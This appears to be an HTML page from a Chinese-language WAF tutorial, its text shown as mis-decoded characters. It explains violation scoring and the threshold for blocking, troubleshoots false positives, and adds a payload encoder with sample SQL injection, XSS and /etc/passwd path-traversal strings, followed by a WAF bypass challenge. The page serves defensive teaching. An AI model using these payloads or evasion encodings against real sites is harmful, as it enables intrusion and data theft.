â””â”€ ç‰¹æ®Šå­—å…ƒæœªæ­£ç¢ºè·³è„«

<span class="code-danger">VIOL_XML_MALFORMED</span>           <span class="code-comment"># +3~4 XML æ ¼å¼éŒ¯èª¤/æ”»æ“Š</span>
â”œâ”€ XXE (XML External Entity) æ”»æ“Š
â”œâ”€ XML Bomb (Billion Laughs)
â””â”€ ä¸åˆæ³•çš„ XML çµæ§‹

<span class="code-danger">VIOL_PARAMETER</span>               <span class="code-comment"># +3~4 åƒæ•¸é•è¦</span>
â”œâ”€ æœªå®šç¾©çš„åƒæ•¸åç¨±
â”œâ”€ åƒæ•¸å€¼è¶…å‡ºå…è¨±ç¯„åœ
â””â”€ åƒæ•¸é¡å‹ä¸ç¬¦

<span class="code-danger">VIOL_FILETYPE</span>                <span class="code-comment"># +3~4 ç¦æ­¢çš„æª”æ¡ˆé¡å‹</span>
â”œâ”€ åŸ·è¡Œæª”ä¸Šå‚³å˜—è©¦ (.exe, .sh)
â”œâ”€ å±éšªæª”æ¡ˆé¡å‹ (.php, .jsp)
â””â”€ å½è£çš„æª”æ¡ˆå‰¯æª”å

<span class="code-danger">VIOL_METHOD</span>                  <span class="code-comment"># +2~3 ç¦æ­¢çš„ HTTP æ–¹æ³•</span>
â”œâ”€ TRACE, TRACK (XST æ”»æ“Š)
â”œâ”€ DELETE, PUT (æœªæˆæ¬Šæ“ä½œ)
â””â”€ CONNECT (ä»£ç†æ¿«ç”¨)
                        </code>
                    </div>

                    <div style="background: var(--danger-glow); border: 1px solid var(--danger); padding: 1rem; margin-top: 1rem;">
                        <p style="color: var(--danger); font-weight: 500;">âš ï¸ é«˜åˆ†é•è¦é€šå¸¸ä»£è¡¨çœŸå¯¦å¨è„…</p>
                        <ul style="color: var(--text-secondary); margin-top: 0.5rem; padding-left: 1.5rem;">
                            <li style="margin-bottom: 0.5rem;"><code style="color: var(--danger);">VIOL_ATTACK_SIGNATURE</code> åŒ¹é…æ™‚ï¼Œæ‡‰ä»”ç´°æª¢æŸ¥æ˜¯å¦ç‚ºæ”»æ“Š</li>
                            <li style="margin-bottom: 0.5rem;">è‹¥ç‚ºèª¤å ±ï¼Œéœ€èˆ‡å®‰å…¨åœ˜éšŠå”èª¿èª¿æ•´ç‰¹å¾µè¦å‰‡</li>
                            <li style="margin-bottom: 0.5rem;">JSON/XML æ ¼å¼éŒ¯èª¤å¯èƒ½æ˜¯å‰ç«¯ Bug æˆ–æ”»æ“Šå˜—è©¦</li>
                        </ul>
                    </div>
                </div>
            </div>

            <!-- Score Accumulation -->
            <div class="accordion">
                <div class="accordion-header" onclick="toggleAccordion(this)">
                    <h4>è©•åˆ†ç´¯ç©æ©Ÿåˆ¶è©³è§£</h4>
                    <span class="accordion-icon">â–¼</span>
                </div>
                <div class="accordion-content">
                    <p style="margin-bottom: 1rem;">WAF æœƒ<strong>ç¶œåˆè©•ä¼°</strong>å¤šå€‹å› ç´ ä¾†è¨ˆç®—æœ€çµ‚è©•åˆ†ï¼Œè€Œéç°¡å–®åŠ ç¸½ï¼š</p>

                    <div class="code-block">
                        <code>
<span class="code-comment"># è©•åˆ†è¨ˆç®—æ¨¡å‹ï¼ˆç¤ºæ„ï¼‰</span>

<span class="code-keyword">æœ€çµ‚è©•åˆ†</span> = max(
    <span class="code-string">å–®ä¸€æœ€é«˜åˆ†é•è¦</span>,           <span class="code-comment"># å–æœ€åš´é‡çš„é•è¦åˆ†æ•¸</span>
    <span class="code-string">å¤šå€‹ä½åˆ†é•è¦çš„åŠ æ¬Šç´¯ç©</span>    <span class="code-comment"># æˆ–ç´¯ç©æ•ˆæ‡‰</span>
)

<span class="code-comment"># ç¯„ä¾‹ 1: å–®ä¸€é«˜åˆ†é•è¦</span>
VIOL_ATTACK_SIGNATURE (SQL Injection)
â””â”€ è©•åˆ†: <span class="code-danger">5</span> â†’ ç›´æ¥é˜»æ“‹

<span class="code-comment"># ç¯„ä¾‹ 2: å¤šå€‹ä½åˆ†ç´¯ç©</span>
VIOL_BOT_CLIENT           +1
VIOL_HTTP_RESPONSE_STATUS +2 (429 å›æ‡‰)
suspicious_pattern        +1
                         â”€â”€â”€â”€
â””â”€ ç´¯ç©è©•åˆ†: <span class="code-danger">4</span> â†’ é”åˆ°é–¾å€¼ï¼Œé˜»æ“‹

<span class="code-comment"># ç¯„ä¾‹ 3: é›–æœ‰é•è¦ä½†æœªé”é–¾å€¼</span>
VIOL_BOT_CLIENT           +1
VIOL_HEADER_LENGTH        +1
                         â”€â”€â”€â”€
â””â”€ ç´¯ç©è©•åˆ†: <span class="code-string">2</span> â†’ æœªé”é–¾å€¼ï¼Œæ”¾è¡Œï¼ˆä½†è¨˜éŒ„ï¼‰
                        </code>
                    </div>

                    <h4 style="margin-top: 1.5rem; margin-bottom: 0.5rem; color: var(--cyan); font-size: 0.875rem;">å½±éŸ¿è©•åˆ†çš„é¡å¤–å› ç´ ï¼š</h4>
                    <ul style="color: var(--text-secondary); padding-left: 1.5rem;">
                        <li style="margin-bottom: 0.5rem;"><strong>æ”»æ“Šé¡å‹ (attackType)</strong>ï¼šè­˜åˆ¥å‡ºçš„æ”»æ“Šé¡å‹æœƒå½±éŸ¿åŸºç¤åˆ†æ•¸</li>
                        <li style="margin-bottom: 0.5rem;"><strong>å¾Œç«¯å›æ‡‰ç‹€æ…‹</strong>ï¼š4xx/5xx éŒ¯èª¤æœƒå¢åŠ å¯ç–‘ç¨‹åº¦</li>
                        <li style="margin-bottom: 0.5rem;"><strong>è«‹æ±‚é »ç‡</strong>ï¼šçŸ­æ™‚é–“å…§å¤§é‡è«‹æ±‚å¯èƒ½æé«˜è©•åˆ†</li>
                        <li style="margin-bottom: 0.5rem;"><strong>åœ°ç†ä½ç½®</strong>ï¼šä¾†è‡ªé«˜é¢¨éšªå€åŸŸçš„è«‹æ±‚å¯èƒ½æœ‰é¡å¤–æ¬Šé‡</li>
                        <li style="margin-bottom: 0.5rem;"><strong>æ­·å²è¡Œç‚º</strong>ï¼šIP éå»çš„é•è¦è¨˜éŒ„å¯èƒ½å½±éŸ¿è©•åˆ†</li>
                    </ul>
                </div>
            </div>

            <!-- Common Issues and Solutions -->
            <h3 style="margin-top: 3rem; margin-bottom: 1.5rem; font-family: 'JetBrains Mono', monospace; color: var(--amber); font-size: 0.875rem; text-transform: uppercase; letter-spacing: 0.1em;">å¸¸è¦‹å•é¡Œèˆ‡è§£æ±ºæ–¹æ¡ˆ</h3>

            <!-- Issue 1: API Client Blocked -->
            <div class="card" style="margin-bottom: 1.5rem;">
                <span class="attack-badge badge-high">å•é¡Œ 1</span>
                <h3><span class="icon">[API]</span> å¾Œç«¯ API å®¢æˆ¶ç«¯æŒçºŒè¢«é˜»æ“‹</h3>

                <h4 style="margin-top: 1rem; margin-bottom: 0.5rem; color: var(--text-secondary); font-size: 0.875rem;">å…¸å‹æ—¥èªŒç‰¹å¾µï¼š</h4>
                <div class="code-block" style="font-size: 0.75rem;">
                    <code>"violations": [
  { "name": "<span class="code-string">VIOL_BOT_CLIENT</span>", "isBlocked": false },
  { "name": "<span class="code-danger">VIOL_RATING_THREAT</span>", "isBlocked": <span class="code-danger">true</span> }
],
"enforcementState": {
  "rating": <span class="code-danger">4</span>,
  "attackType": [{ "name": "<span class="code-string">Non-browser Client</span>" }]
}</code>
                </div>

                <h4 style="margin-top: 1rem; margin-bottom: 0.5rem; color: var(--phosphor); font-size: 0.875rem;">åŸå› åˆ†æï¼š</h4>
                <ul style="color: var(--text-secondary); padding-left: 1.5rem;">
                    <li style="margin-bottom: 0.5rem;">User-Agent ç‚ºç¨‹å¼åº«é è¨­å€¼ (python-requests, Go-http-client, axios)</li>
                    <li style="margin-bottom: 0.5rem;">ç¼ºå°‘ç€è¦½å™¨ç‰¹æœ‰çš„ Header (Accept-Language, Sec-Fetch-*)</li>
                    <li style="margin-bottom: 0.5rem;">åŠ ä¸Šå¾Œç«¯ 4xx/5xx éŒ¯èª¤ï¼Œç´¯ç©é”åˆ°é–¾å€¼</li>
                </ul>

                <h4 style="margin-top: 1rem; margin-bottom: 0.5rem; color: var(--amber); font-size: 0.875rem;">è§£æ±ºæ–¹æ¡ˆï¼š</h4>
                <div class="code-block" style="font-size: 0.75rem;">
                    <code><span class="code-comment"># Python ç¯„ä¾‹ - è¨­å®šè‡ªè¨‚ User-Agent</span>
import requests

headers = {
    <span class="code-string">'User-Agent'</span>: <span class="code-string">'MyApp/1.0 (Internal API Client; contact@example.com)'</span>,
    <span class="code-string">'Accept'</span>: <span class="code-string">'application/json'</span>
}
response = requests.get(url, headers=headers)

<span class="code-comment"># Go ç¯„ä¾‹</span>
req.Header.Set(<span class="code-string">"User-Agent"</span>, <span class="code-string">"MyApp/1.0 (Internal Service)"</span>)

<span class="code-comment"># WAF è¨­å®š - å°‡å…§éƒ¨æœå‹™ IP åŠ å…¥ç™½åå–®</span>
<span class="code-comment"># æˆ–è¨­å®šç‰¹å®š User-Agent ç‚ºå¯ä¿¡ä»»</span></code>
                </div>
            </div>

            <!-- Issue 2: Rating 4 with Multiple Low-Score Violations -->
            <div class="card" style="margin-bottom: 1.5rem;">
                <span class="attack-badge badge-high">å•é¡Œ 2</span>
                <h3><span class="icon">[SCORE]</span> å¤šå€‹ä½åˆ†é•è¦ç´¯ç©åˆ° Rating 4</h3>

                <h4 style="margin-top: 1rem; margin-bottom: 0.5rem; color: var(--text-secondary); font-size: 0.875rem;">å…¸å‹æ—¥èªŒç‰¹å¾µï¼š</h4>
                <div class="code-block" style="font-size: 0.75rem;">
                    <code>"violations": [
  { "name": "<span class="code-string">VIOL_BOT_CLIENT</span>", "isBlocked": false },
  { "name": "<span class="code-string">VIOL_HTTP_RESPONSE_STATUS</span>", "isBlocked": false },
  { "name": "<span class="code-danger">VIOL_RATING_THREAT</span>", "isBlocked": <span class="code-danger">true</span> }
],
"responseCode": <span class="code-danger">429</span>,  <span class="code-comment"># å¾Œç«¯å›å‚³ Too Many Requests</span>
"enforcementState": { "rating": <span class="code-danger">4</span> }</code>
                </div>

                <h4 style="margin-top: 1rem; margin-bottom: 0.5rem; color: var(--phosphor); font-size: 0.875rem;">åŸå› åˆ†æï¼š</h4>
                <p style="color: var(--text-secondary);">é›–ç„¶æ¯å€‹é•è¦åˆ†æ•¸ä¸é«˜ï¼Œä½†ç´¯ç©æ•ˆæ‡‰é”åˆ°é˜»æ“‹é–¾å€¼ã€‚é€™ç¨®æƒ…æ³å¸¸è¦‹æ–¼ï¼š</p>
                <ul style="color: var(--text-secondary); padding-left: 1.5rem; margin-top: 0.5rem;">
                    <li style="margin-bottom: 0.5rem;">API å®¢æˆ¶ç«¯é‡åˆ°å¾Œç«¯é™æµ (429)</li>
                    <li style="margin-bottom: 0.5rem;">å¾Œç«¯æœå‹™æš«æ™‚ä¸å¯ç”¨ (503)</li>
                    <li style="margin-bottom: 0.5rem;">è«‹æ±‚åƒæ•¸å°è‡´å¾Œç«¯éŒ¯èª¤ (500)</li>
                </ul>

                <h4 style="margin-top: 1rem; margin-bottom: 0.5rem; color: var(--amber); font-size: 0.875rem;">è§£æ±ºæ–¹æ¡ˆï¼š</h4>
                <ul style="color: var(--text-secondary); padding-left: 1.5rem;">
                    <li style="margin-bottom: 0.5rem;">èª¿æ•´ WAF ç­–ç•¥ï¼Œå°‡ VIOL_HTTP_RESPONSE_STATUS çš„æ¬Šé‡é™ä½</li>
                    <li style="margin-bottom: 0.5rem;">ç‚ºç‰¹å®š API è·¯å¾‘è¨­å®šè¼ƒé«˜çš„é–¾å€¼</li>
                    <li style="margin-bottom: 0.5rem;">ä¿®å¾©å¾Œç«¯å•é¡Œï¼Œæ¸›å°‘ 4xx/5xx éŒ¯èª¤ç™¼ç”Ÿ</li>
                </ul>
            </div>

            <!-- Issue 3: JSON Malformed -->
            <div class="card" style="margin-bottom: 1.5rem;">
                <span class="attack-badge badge-critical">å•é¡Œ 3</span>
                <h3><span class="icon">[JSON]</span> VIOL_JSON_MALFORMED ç›´æ¥è§¸ç™¼é«˜åˆ†</h3>

                <h4 style="margin-top: 1rem; margin-bottom: 0.5rem; color: var(--text-secondary); font-size: 0.875rem;">å…¸å‹æ—¥èªŒç‰¹å¾µï¼š</h4>
                <div class="code-block" style="font-size: 0.75rem;">
                    <code>"violations": [
  { "name": "<span class="code-danger">VIOL_JSON_MALFORMED</span>", "isBlocked": <span class="code-danger">true</span> },
  { "name": "<span class="code-danger">VIOL_RATING_THREAT</span>", "isBlocked": <span class="code-danger">true</span> }
],
"enforcementState": {
  "rating": <span class="code-danger">4</span>,
  "attackType": [{ "name": "<span class="code-danger">JSON Parser Attack</span>" }]
},
"responseCode": <span class="code-danger">0</span>  <span class="code-comment"># è«‹æ±‚è¢« WAF æ””æˆªï¼Œæœªåˆ°é”å¾Œç«¯</span></code>
                </div>

                <h4 style="margin-top: 1rem; margin-bottom: 0.5rem; color: var(--phosphor); font-size: 0.875rem;">å¸¸è¦‹è§¸ç™¼åŸå› ï¼š</h4>
                <ul style="color: var(--text-secondary); padding-left: 1.5rem;">
                    <li style="margin-bottom: 0.5rem;">JSON ä¸­åŒ…å«æœªæ­£ç¢ºè·³è„«çš„ç‰¹æ®Šå­—å…ƒ (<code style="color: var(--danger);">\", \\, \n</code>)</li>
                    <li style="margin-bottom: 0.5rem;">JSON å€¼ä¸­åŒ…å« HTML æ¨™ç±¤ (<code style="color: var(--danger);">&lt;script&gt;, &lt;img&gt;</code>)</li>
                    <li style="margin-bottom: 0.5rem;">å¤§å‹æˆ–æ·±åº¦å·¢ç‹€çš„ JSON çµæ§‹</li>
                    <li style="margin-bottom: 0.5rem;">Content-Type èˆ‡å¯¦éš›å…§å®¹ä¸ç¬¦</li>
                </ul>

                <h4 style="margin-top: 1rem; margin-bottom: 0.5rem; color: var(--amber); font-size: 0.875rem;">è§£æ±ºæ–¹æ¡ˆï¼š</h4>
                <div class="code-block" style="font-size: 0.75rem;">
                    <code><span class="code-comment"># 1. ç¢ºä¿ JSON æ­£ç¢ºç·¨ç¢¼</span>
import json
data = {"content": "åŒ…å« &lt;script&gt; çš„æ–‡å­—"}
json_str = json.dumps(data)  <span class="code-comment"># æœƒè‡ªå‹•è·³è„«ç‰¹æ®Šå­—å…ƒ</span>

<span class="code-comment"># 2. è‹¥éœ€è¦å‚³é€ HTML å…§å®¹ï¼Œè€ƒæ…® Base64 ç·¨ç¢¼</span>
import base64
html_content = base64.b64encode(html.encode()).decode()
data = {"html_base64": html_content}

<span class="code-comment"># 3. èˆ‡ WAF ç®¡ç†å“¡å”èª¿ï¼Œè¨­å®šä¾‹å¤–è¦å‰‡</span>
<span class="code-comment"># å…è¨±ç‰¹å®šæ¬„ä½åŒ…å« HTML å…§å®¹</span></code>
                </div>
            </div>

            <!-- Quick Reference Table -->
            <div class="rule-demo" style="margin-top: 2rem;">
                <h3 style="margin-bottom: 1rem;">é•è¦é¡å‹èˆ‡è©•åˆ†å¿«é€Ÿåƒè€ƒ</h3>
                <div class="code-block">
                    <code>
<span class="code-keyword">é•è¦é¡å‹                          è©•åˆ†    èªªæ˜</span>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
<span class="code-comment"># ä½åˆ†é•è¦ (é€šå¸¸ä¸å–®ç¨é€ æˆé˜»æ“‹)</span>
<span class="code-string">VIOL_BOT_CLIENT</span>                   1-2    éç€è¦½å™¨å®¢æˆ¶ç«¯
<span class="code-string">VIOL_HTTP_RESPONSE_STATUS</span>         1-2    ç•°å¸¸ HTTP å›æ‡‰ç‹€æ…‹
<span class="code-string">VIOL_HEADER_LENGTH</span>                1      Header é•·åº¦ç•°å¸¸
<span class="code-string">VIOL_COOKIE_LENGTH</span>                1      Cookie é•·åº¦ç•°å¸¸
<span class="code-string">VIOL_ENCODING</span>                     1-2    ç·¨ç¢¼ç•°å¸¸

<span class="code-comment"># ä¸­åˆ†é•è¦ (éœ€é—œæ³¨)</span>
<span class="code-string">VIOL_METHOD</span>                       2-3    ç¦æ­¢çš„ HTTP æ–¹æ³•
<span class="code-string">VIOL_URL</span>                          2-3    URL æ ¼å¼ç•°å¸¸
<span class="code-string">VIOL_PARAMETER</span>                    2-4    åƒæ•¸é•è¦

<span class="code-comment"># é«˜åˆ†é•è¦ (é€šå¸¸ç›´æ¥é˜»æ“‹)</span>
<span class="code-danger">VIOL_ATTACK_SIGNATURE</span>             3-5    åŒ¹é…æ”»æ“Šç‰¹å¾µ
<span class="code-danger">VIOL_JSON_MALFORMED</span>               3-4    JSON æ ¼å¼éŒ¯èª¤
<span class="code-danger">VIOL_XML_MALFORMED</span>                3-4    XML æ ¼å¼éŒ¯èª¤
<span class="code-danger">VIOL_FILETYPE</span>                     3-4    ç¦æ­¢çš„æª”æ¡ˆé¡å‹

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
<span class="code-keyword">é–¾å€¼</span>: ç´¯ç©è©•åˆ† >= <span class="code-danger">4</span> æ™‚è§¸ç™¼ <span class="code-danger">VIOL_RATING_THREAT</span> é˜»æ“‹
                    </code>
                </div>
            </div>

            <!-- Diagnostic Flowchart -->
            <div class="rule-demo" style="margin-top: 2rem;">
                <h3 style="margin-bottom: 1rem;">VIOL_RATING_THREAT è¨ºæ–·æµç¨‹</h3>
                <div class="code-block">
                    <code>
<span class="code-keyword">æ”¶åˆ° VIOL_RATING_THREAT é˜»æ“‹</span>
â”‚
â”œâ”€<span class="code-keyword">Step 1:</span> æª¢æŸ¥ violations[] é™£åˆ—
â”‚  â””â”€ æ‰¾å‡ºæ‰€æœ‰ violation.name
â”‚
â”œâ”€<span class="code-keyword">Step 2:</span> å€åˆ†é•è¦é¡å‹
â”‚  â”œâ”€ <span class="code-danger">é«˜åˆ†é•è¦</span> (VIOL_ATTACK_SIGNATURE, VIOL_JSON_MALFORMED...)
â”‚  â”‚  â””â”€ ç›´æ¥åˆ†æè©²é•è¦çš„è§¸ç™¼åŸå› 
â”‚  â”‚
â”‚  â””â”€ <span class="code-string">åªæœ‰ä½åˆ†é•è¦</span> (VIOL_BOT_CLIENT, VIOL_HTTP_RESPONSE_STATUS...)
â”‚     â””â”€ æ˜¯ç´¯ç©æ•ˆæ‡‰ï¼Œéœ€åˆ†æå¤šå€‹å› ç´ 
â”‚
â”œâ”€<span class="code-keyword">Step 3:</span> è§£ç¢¼ rawRequest
â”‚  â””â”€ æ‰¾å‡ºè§¸ç™¼è¦å‰‡çš„å…·é«”å…§å®¹
â”‚     â”œâ”€ User-Agent æ˜¯ä»€éº¼ï¼Ÿ
â”‚     â”œâ”€ è«‹æ±‚åƒæ•¸æœ‰å•é¡Œå—ï¼Ÿ
â”‚     â””â”€ Body å…§å®¹æ˜¯å¦åŒ…å«å¯ç–‘å­—ä¸²ï¼Ÿ
â”‚
â”œâ”€<span class="code-keyword">Step 4:</span> æª¢æŸ¥ responseCode
â”‚  â”œâ”€ <span class="code-string">200</span> â†’ å¾Œç«¯æ­£å¸¸å›æ‡‰
â”‚  â”œâ”€ <span class="code-amber">4xx</span> â†’ å®¢æˆ¶ç«¯éŒ¯èª¤ï¼Œå¯èƒ½å¢åŠ è©•åˆ†
â”‚  â”œâ”€ <span class="code-danger">5xx</span> â†’ å¾Œç«¯éŒ¯èª¤ï¼Œå¯èƒ½å¢åŠ è©•åˆ†
â”‚  â””â”€ <span class="code-danger">0</span>   â†’ è¢« WAF æ””æˆªï¼Œæœªåˆ°é”å¾Œç«¯
â”‚
â””â”€<span class="code-keyword">Step 5:</span> æ±ºå®šè™•ç†æ–¹å¼
   â”œâ”€ <span class="code-phosphor">åˆæ³•è«‹æ±‚</span> â†’ èª¿æ•´ WAF è¦å‰‡/åŠ ç™½åå–®
   â”œâ”€ <span class="code-amber">å¯ç–‘è«‹æ±‚</span> â†’ æŒçºŒç›£æ§ï¼Œæ”¶é›†æ›´å¤šè³‡è¨Š
   â””â”€ <span class="code-danger">ç¢ºèªæ”»æ“Š</span> â†’ åŠ å¼·é˜²è­·ï¼Œå¯è€ƒæ…®å°é–ä¾†æº
                    </code>
                </div>
            </div>
        </section>

        <!-- Interactive Tools Section -->
        <section id="tools">
            <h2>å¯¦ç”¨å·¥å…·ç®±</h2>
            <p style="color: var(--text-secondary); margin-bottom: 2rem;">å‹•æ‰‹è©¦è©¦é€™äº›å·¥å…·ï¼Œç†è§£ç·¨ç¢¼è½‰æ›èˆ‡è©•åˆ†æ©Ÿåˆ¶å¦‚ä½•å½±éŸ¿ WAF çš„åˆ¤æ–·ã€‚</p>

            <!-- Payload Encoder/Decoder -->
            <div class="rule-demo" style="margin-bottom: 2rem;">
                <h3 style="margin-bottom: 0.5rem;">Payload ç·¨ç¢¼è½‰æ›å™¨</h3>
                <p style="color: var(--text-secondary); font-size: 0.875rem; margin-bottom: 1rem;">äº†è§£æ”»æ“Šè€…å¦‚ä½•ä½¿ç”¨ç·¨ç¢¼ä¾†å˜—è©¦ç¹é WAF æª¢æ¸¬</p>

                <div class="encoder-actions" style="margin-bottom: 1rem;">
                    <button class="encoder-type-btn active" data-encode="url">URL Encode</button>
                    <button class="encoder-type-btn" data-encode="base64">Base64</button>
                    <button class="encoder-type-btn" data-encode="html">HTML Entities</button>
                    <button class="encoder-type-btn" data-encode="unicode">Unicode</button>
                    <button class="encoder-type-btn" data-encode="double">é›™é‡ç·¨ç¢¼</button>
                </div>

                <div class="encoder-container">
                    <div class="encoder-box">
                        <label>$ input <span style="color: var(--text-dim);">(åŸå§‹æ–‡å­—)</span></label>
                        <textarea id="encoder-input" placeholder="è¼¸å…¥è¦ç·¨ç¢¼çš„æ–‡å­—ï¼Œä¾‹å¦‚ï¼š' OR 1=1--"></textarea>
                    </div>
                    <div class="encoder-box">
                        <label>$ output <span style="color: var(--text-dim);">(ç·¨ç¢¼çµæœ)</span></label>
                        <textarea id="encoder-output" readonly placeholder="ç·¨ç¢¼çµæœå°‡é¡¯ç¤ºåœ¨é€™è£¡..."></textarea>
                    </div>
                </div>

                <div style="display: flex; gap: 0.5rem; margin-top: 1rem; flex-wrap: wrap;">
                    <button class="btn btn-primary" onclick="encodePayload()">ç·¨ç¢¼ â†’</button>
                    <button class="btn btn-secondary" onclick="decodePayload()">â† è§£ç¢¼</button>
                    <button class="btn btn-secondary" onclick="swapEncoder()">â‡„ äº¤æ›</button>
                    <button class="btn btn-secondary" onclick="clearEncoder()">æ¸…é™¤</button>
                </div>

                <div style="margin-top: 1rem;">
                    <p style="color: var(--text-dim); font-size: 0.75rem;">å¿«é€Ÿç¯„ä¾‹ï¼š</p>
                    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-top: 0.5rem;">
                        <button class="btn btn-secondary" style="font-size: 0.6875rem;" onclick="setEncoderInput(`' OR '1'='1`)">SQLi åŸºæœ¬</button>
                        <button class="btn btn-secondary" style="font-size: 0.6875rem;" onclick="setEncoderInput('<script>alert(1)</script>')">XSS</button>
                        <button class="btn btn-secondary" style="font-size: 0.6875rem;" onclick="setEncoderInput('../../../etc/passwd')">Path Traversal</button>
                    </div>
                </div>

                <div class="terminal-output" id="encoder-log" style="margin-top: 1rem; display: none;"></div>
            </div>

            <!-- Score Calculator -->
            <div class="rule-demo">
                <h3 style="margin-bottom: 0.5rem;">å¨è„…è©•åˆ†è¨ˆç®—å™¨</h3>
                <p style="color: var(--text-secondary); font-size: 0.875rem; margin-bottom: 1.5rem;">é¸æ“‡é•è¦é¡å‹ï¼Œè§€å¯Ÿè©•åˆ†å¦‚ä½•ç´¯ç©ä¸¦è§¸ç™¼ VIOL_RATING_THREAT</p>

                <div class="score-calculator">
                    <div class="score-display" id="score-display">
                        <div class="score-number" id="score-number">0</div>
                        <div class="score-status" id="score-status" style="color: var(--phosphor);">[ALLOWED] è«‹æ±‚æ”¾è¡Œ</div>
                        <div class="score-threshold">blocking_threshold: 4</div>
                    </div>

                    <p style="color: var(--text-dim); font-size: 0.75rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace;">// LOW_RISK_VIOLATIONS</p>
                    <div class="violation-checklist" style="margin-bottom: 1.5rem;">
                        <div class="violation-item" data-score="1" onclick="toggleViolation(this)">
                            <div class="violation-checkbox">âœ“</div>
                            <div class="violation-info">
                                <div class="violation-name">VIOL_BOT_CLIENT</div>
                                <div class="violation-score">+1 åµæ¸¬åˆ°éç€è¦½å™¨å®¢æˆ¶ç«¯</div>
                            </div>
                        </div>
                        <div class="violation-item" data-score="1" onclick="toggleViolation(this)">
                            <div class="violation-checkbox">âœ“</div>
                            <div class="violation-info">
                                <div class="violation-name">VIOL_HEADER_LENGTH</div>
                                <div class="violation-score">+1 Header é•·åº¦ç•°å¸¸</div>
                            </div>
                        </div>
                        <div class="violation-item" data-score="2" onclick="toggleViolation(this)">
                            <div class="violation-checkbox">âœ“</div>
                            <div class="violation-info">
                                <div class="violation-name">VIOL_HTTP_RESPONSE_STATUS</div>
                                <div class="violation-score">+2 ç•°å¸¸ HTTP å›æ‡‰ (4xx/5xx)</div>
                            </div>
                        </div>
                        <div class="violation-item" data-score="1" onclick="toggleViolation(this)">
                            <div class="violation-checkbox">âœ“</div>
                            <div class="violation-info">
                                <div class="violation-name">VIOL_ENCODING</div>
                                <div class="violation-score">+1 ç·¨ç¢¼ç•°å¸¸</div>
                            </div>
                        </div>
                    </div>

                    <p style="color: var(--danger); font-size: 0.75rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace;">// HIGH_RISK_VIOLATIONS</p>
                    <div class="violation-checklist">
                        <div class="violation-item high-risk" data-score="3" onclick="toggleViolation(this)">
                            <div class="violation-checkbox">âœ“</div>
                            <div class="violation-info">
                                <div class="violation-name">VIOL_PARAMETER</div>
                                <div class="violation-score">+3 åƒæ•¸é•è¦</div>
                            </div>
                        </div>
                        <div class="violation-item high-risk" data-score="4" onclick="toggleViolation(this)">
                            <div class="violation-checkbox">âœ“</div>
                            <div class="violation-info">
                                <div class="violation-name">VIOL_JSON_MALFORMED</div>
                                <div class="violation-score">+4 JSON æ ¼å¼éŒ¯èª¤</div>
                            </div>
                        </div>
                        <div class="violation-item high-risk" data-score="4" onclick="toggleViolation(this)">
                            <div class="violation-checkbox">âœ“</div>
                            <div class="violation-info">
                                <div class="violation-name">VIOL_ATTACK_SIGNATURE</div>
                                <div class="violation-score">+4 åŒ¹é…æ”»æ“Šç‰¹å¾µ</div>
                            </div>
                        </div>
                        <div class="violation-item high-risk" data-score="3" onclick="toggleViolation(this)">
                            <div class="violation-checkbox">âœ“</div>
                            <div class="violation-info">
                                <div class="violation-name">VIOL_FILETYPE</div>
                                <div class="violation-score">+3 ç¦æ­¢çš„æª”æ¡ˆé¡å‹</div>
                            </div>
                        </div>
                    </div>

                    <div style="margin-top: 1.5rem; display: flex; gap: 0.5rem;">
                        <button class="btn btn-secondary" onclick="resetScoreCalculator()">$ reset</button>
                        <button class="btn btn-secondary" onclick="simulateApiClient()">æ¨¡æ“¬ API å®¢æˆ¶ç«¯</button>
                        <button class="btn btn-secondary" onclick="simulateAttack()">æ¨¡æ“¬æ”»æ“Šè«‹æ±‚</button>
                    </div>
                </div>
            </div>
        </section>

        <!-- Bypass Challenge Section -->
        <section id="challenge">
            <h2>ç¹éæŒ‘æˆ°</h2>
            <p style="color: var(--text-secondary); margin-bottom: 2rem;">é‹ç”¨ä½ å­¸åˆ°çš„çŸ¥è­˜ï¼Œå˜—è©¦ç¹é WAF è¦å‰‡ã€‚é€™æœ‰åŠ©æ–¼ç†è§£é˜²è­·çš„å¼±é»èˆ‡å¦‚ä½•åŠ å¼·ã€‚</p>

            <div class="challenge-container">
                <div class="challenge-header">
                    <div class="challenge-level">
                        <button class="level-btn active" data-level="0">Level 1</button>
                        <button class="level-btn" data-level="1">Level 2</button>
                        <button class="level-btn" data-level="2">Level 3</button>
                        <button class="level-btn" data-level="3">Level 4</button>
                        <button class="level-btn" data-level="4">Level 5</button>
                    </div>
                    <div class="challenge-stats">
                        å®Œæˆ: <span id="challenge-completed">0</span>/5
                    </div>
                </div>

                <div class="challenge-mission" id="challenge-mission">
                    <h4>// MISSION_BRIEFING</h4>
                    <p id="challenge-description">è¼‰å…¥ä¸­...</p>
                    <div class="challenge-target" id="challenge-target"></div>
                    <p style="color: var(--text-dim); font-size: 0.8125rem; margin-top: 0.75rem;">
                        <span style="color: var(--amber);">ç›®æ¨™ï¼š</span> <span id="challenge-goal"></span>
                    </p>
                    <div class="challenge-hint" id="challenge-hint"></div>
                </div>

                <div class="challenge-input-area">
                    <input type="text" class="challenge-input" id="challenge-input" placeholder="è¼¸å…¥ä½ çš„ payload...">
                </div>

                <div class="challenge-actions">
                    <button class="btn btn-primary" onclick="submitChallenge()">$ ./exploit</button>
                    <button class="btn btn-secondary" onclick="showHint()">ğŸ’¡ æç¤º</button>
                    <button class="btn btn-secondary" onclick="testInSimulator()">åœ¨æ¨¡æ“¬å™¨æ¸¬è©¦</button>
                </div>

                <div class="challenge-result" id="challenge-result">
                    <h5 id="challenge-result-title"></h5>
                    <p id="challenge-result-message" style="color: var(--text-secondary); font-size: 0.875rem;"></p>
                    <div id="challenge-result-detail" style="margin-top: 0.75rem;"></div>
                </div>
